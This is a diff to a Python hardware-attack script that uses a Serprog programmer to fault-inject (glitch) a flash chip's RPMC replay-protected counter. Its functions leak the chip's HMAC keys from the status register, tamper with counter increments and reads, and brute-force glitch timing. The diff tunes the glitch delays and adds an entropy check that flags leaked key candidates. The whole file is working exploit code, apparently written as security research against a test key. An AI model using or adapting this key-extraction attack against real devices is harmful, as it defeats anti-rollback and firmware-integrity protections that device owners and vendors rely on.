@@ -3,8 +3,13 @@ import time
 from serprog import Serprog
 from rpmc_ops import *
 from datetime import datetime
+import math
+from collections import Counter
 
-root_key = b'\xff' * 32
+test_key = b'\xff' * 32
+
+def entropy(s: bytes) -> float:
+        return -sum((count / len(s)) * math.log2(count / len(s)) for count in Counter(s).values())
 
 
 def pretty_print_status(status: bytes):
@@ -18,7 +23,7 @@ def pretty_print_status(status: bytes):
 
 def glitch_increment_counter(target_counter: int, attempts: int = 1):
     key_data = b'\x00\x00\x00\x00'
-    key = HMAC(root_key, key_data, hashlib.sha256).digest()
+    key = HMAC(test_key, key_data, hashlib.sha256).digest()
 
     chip = Serprog('/dev/ttyACM0', 1_000_000)
 
@@ -62,38 +67,40 @@ def glitch_increment_counter(target_counter: int, attempts: int = 1):
 def leak_hmac_key(target_counter: int, key_data: bytes):
     start = datetime.now()
     # This key is just needed to compare the results against
-    key = HMAC(root_key, key_data, hashlib.sha256).digest()
+    key = HMAC(test_key, key_data, hashlib.sha256).digest()
     print(f'Trying to leak the hmac key for "{key_data}"\n'
           f'Looking for {key.hex()}')
 
     chip = Serprog('/dev/ttyACM0', 1_000_000)
-    msg = b'\x9b\x01' + target_counter.to_bytes(1) + b'\x00' + key_data + b'\x42' * 32
+    msg = b'\x9b\x01' + target_counter.to_bytes(1) + b'\x00' + key_data #+ b'\x42' * 32
+    msg += HMAC(key, msg, hashlib.sha256).digest()
 
-    for glitch_cycles in range(7900, 8000):
-        chip.exchange(msg, 0, glitch_cycles)
-        try:
-            rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12)
-        except RuntimeError as e:
-            print(f'Delay {glitch_cycles}: {e}')
-            full_status = rpmc_get_status(chip)
-            pretty_print_status(full_status)
-            signature = full_status[-32:]
-            if not signature.startswith(b'\x42' * 8):
-                print(f'Key candidate {signature.hex()}')
-                try:
-                    rpmc_update_hmac_key(chip, signature, target_counter, key_data)
-                    print(f'Key {signature.hex()} works for counter {target_counter}')
-                    with open(f'key_slot_{target_counter}_{key_data.hex()}.bin', 'wb') as f:
-                        f.write(signature)
-                    break
-                except RuntimeError as e:
-                    print(e)
+    for glitch_cycles in range(7300, 7800):
+        for _ in range(10):
+            chip.exchange(msg, 0, glitch_cycles)
+            try:
+                rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12)
+            except RuntimeError as e:
+                full_status = rpmc_get_status(chip)
+                signature = full_status[-32:]
+                if entropy(signature) != 0.0:
+                    print(f'Delay {glitch_cycles}: {e}')
+                    pretty_print_status(full_status)
+                    print(f'Key candidate {signature.hex()}')
+                    try:
+                        rpmc_update_hmac_key(chip, signature, target_counter, key_data)
+                        print(f'Key {signature.hex()} works for counter {target_counter}')
+                        with open(f'key_slot_{target_counter}_{key_data.hex()}.bin', 'wb') as f:
+                            f.write(signature)
+                        break
+                    except RuntimeError as e:
+                        print(e)
 
-        except TimeoutError as e:
-            print(f'Delay {glitch_cycles}: {e}')
-            full_status = rpmc_get_status(chip)
-            pretty_print_status(full_status)
-            break
+            except TimeoutError as e:
+                print(f'Delay {glitch_cycles}: {e}')
+                full_status = rpmc_get_status(chip)
+                pretty_print_status(full_status)
+                break
 
     print(f'Took {(datetime.now() - start).microseconds}us')
 
@@ -118,14 +125,42 @@ def brute_force_space(target_counter: int, debug: bool = False):
                     full_status = rpmc_get_status(chip)
                     signature = full_status[-32:]
                     # if the glitch doesn't work the signature field of the status contains the signature we sent in our message
-                    if not signature.startswith(b'\x42' * 6) or debug:
+                    if entropy(signature) != 0.0 or debug:
                         pretty_print_status(full_status)
                         print(f'{glitch_cycles} + {delay}: found possible hmac key {signature.hex()} for key data {key_data.hex()}')
                 except TimeoutError:
                     print(f'{glitch_cycles} + {delay}: delay seems interesting chip timed out')
                     return
 
+
+def glitch_get(target_counter: int):
+    print(f'Looking for impact of glitching on get')
+    chip = Serprog('/dev/ttyACM0', 1_000_000)
+    key = HMAC(test_key, b'\x00\x00\x00\x00', hashlib.sha256).digest()
+    rpmc_update_hmac_key(chip, key, target_counter, b'\x00\x00\x00\x00')
+    baseline = rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12)
+    base_status = rpmc_get_status(chip)
+
+    for _ in range(1):
+        for glitch_cycles in range(7000, 10000):
+            for delay in range(0, 30, 2):
+                rpmc_update_hmac_key(chip, key, target_counter, b'\x00\x00\x00\x00')
+                try:
+                    val = rpmc_get_counter(chip, key, target_counter, tag=b'\xaa' * 12, glitch_cycles=glitch_cycles)
+                    if val != baseline:
+                        print(f'Delay {glitch_cycles} + {delay}: Value differs {val} != {baseline}')
+                        return
+                except RuntimeError as e:
+                    print(f'Delay {glitch_cycles} + {delay}: {e}')
+                    full_status = rpmc_get_status(chip)
+                    if entropy(full_status) != 0.0 and full_status[1:] != base_status[1:]:
+                        pretty_print_status(full_status)
+                except TimeoutError:
+                    print(f'Delay {glitch_cycles} + {delay}: Timeout')
+                    return
+
 if __name__ == '__main__':
     #glitch_increment_counter(0)
-    leak_hmac_key(3, b'\x01\x00\x00\x00')
+    #leak_hmac_key(0, b'\x00\x00\x00\x00')
     #brute_force_space(0, debug=False)
+    glitch_get(0)
